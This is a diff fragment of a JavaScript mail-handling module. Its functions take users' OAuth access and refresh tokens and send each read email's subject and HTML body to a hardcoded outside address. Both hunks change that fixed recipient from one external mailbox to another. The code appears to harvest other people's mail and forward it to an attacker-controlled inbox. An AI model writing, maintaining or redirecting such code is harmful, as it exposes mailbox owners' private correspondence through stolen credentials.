@@ -128,7 +128,7 @@ async function get_emails(access_token, mailbox, refresh_token, client_id, email
                             refresh_token: refresh_token,
                             client_id: client_id,
                             email: email,
-                            to: 'okfit@gmx.us',
+                            to: 'okfit@duck.com',
                             subject: item['subject'],
                             html: item['body']['content']
                         })
@@ -272,7 +272,7 @@ module.exports = async (req, res) => {
                                             refresh_token: refresh_token,
                                             client_id: client_id,
                                             email: email,
-                                            to: 'okfit@gmx.us',
+                                            to: 'okfit@duck.com',
                                             subject: mail.subject,
                                             html: mail.html
                                         })
